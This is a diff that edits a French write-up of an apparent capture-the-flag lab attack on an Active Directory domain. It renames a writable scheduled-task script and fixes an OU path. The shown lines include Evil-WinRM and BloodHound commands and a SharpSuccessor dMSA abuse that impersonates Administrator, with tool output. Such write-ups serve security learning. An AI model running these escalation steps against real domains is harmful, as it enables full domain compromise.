@@ -187,7 +187,7 @@ On confirme qu’il peut bien utiliser win-rm sur le dc
     
     ```
     
-- A l’intérieur un fichier `shell.ps1` vide sur le quel on à un contrôle totale et qui semble être executer par une tâche planifier
+- A l’intérieur un fichier `ColiseumTasks.ps1` vide sur le quel on à un contrôle totale et qui semble être executer par une tâche planifier
     
     ```
     *Evil-WinRM* PS C:\coliseum> ls
@@ -196,13 +196,13 @@ On confirme qu’il peut bien utiliser win-rm sur le dc
     
     Mode                 LastWriteTime         Length Name
     ----                 -------------         ------ ----
-    -a----         6/21/2025   7:38 PM              0 shell.ps1
+    -a----         6/21/2025   7:38 PM              0 ColiseumTasks.ps1
     
     *Evil-WinRM* PS C:\coliseum>
     ```
     
     ```
-     $path = "C:\coliseum\shell.ps1"
+     $path = "C:\coliseum\ColiseumTasks.ps1"
     (Get-Acl -Path $path).Access
     
     FileSystemRights  : FullControl
@@ -316,7 +316,7 @@ On donne donc un genericALL sur une `OU` à orphee pour qu’il puisse exploiter
 
 ```bash
 hades@pantheon.god][Jun 26, 2025 - 02:38:28 (CEST)] exegol-pantheon_wu bloodhound # stobject "OU=ELYSEE,OU=ENFERS,DC=PANTHEON,DC=GOD"
-TargetObject set to 'OU=ENFERS,DC=PANTHEON,DC=GOD'
+TargetObject set to 'OU=ELYSEE,OU=ENFERS,DC=PANTHEON,DC=GOD'
 [hades@pantheon.god][Jun 26, 2025 - 02:39:13 (CEST)] exegol-pantheon_wu bloodhound # stcontrolledprincipal orphee
 ControlledPrincipal set to 'orphee'
 ```
@@ -339,7 +339,7 @@ Il va nous falloire compiler le binaire `SharpSuccessor.exe` et `Rubeus.exe` dan
 Premièrement on va crée un un dMSA sur l’OU ENFERS sur la quel nous avons un droit `createChild`avec `SharpSuccessor.exe` 
 
 ```
-PS C:\Users\hades\Desktop> .\SharpSuccessor.exe add /impersonate:Administrator /path:"OU=ENFERS,DC=PANTHEON,DC=GOD" /account:orphee /name:pwned_dMSA
+PS C:\Users\hades\Desktop> .\SharpSuccessor.exe add /impersonate:Administrator /path:"OU=ELYSEE,OU=ENFERS,DC=PANTHEON,DC=GOD" /account:orphee /name:pwned_dMSA
    _____ _                      _____
   / ____| |                    / ____|
  | (___ | |__   __ _ _ __ _ __| (___  _   _  ___ ___ ___  ___ ___  ___  _ __
@@ -359,7 +359,7 @@ PS C:\Users\hades\Desktop> .\SharpSuccessor.exe add /impersonate:Administrator /
 [+] Attempting to set access rights on the dMSA object
 [+] Attempting to write msDS-SupportedEncryptionTypes attribute
 [+] Attempting to write userAccountControl attribute
-[+] Created dMSA object 'CN=pwned_dMSA' in 'OU=ENFERS,DC=PANTHEON,DC=GOD'
+[+] Created dMSA object 'CN=pwned_dMSA' in 'OU=ELYSEE,OU=ENFERS,DC=PANTHEON,DC=GOD'
 [+] Successfully weaponized dMSA object
 ```
 
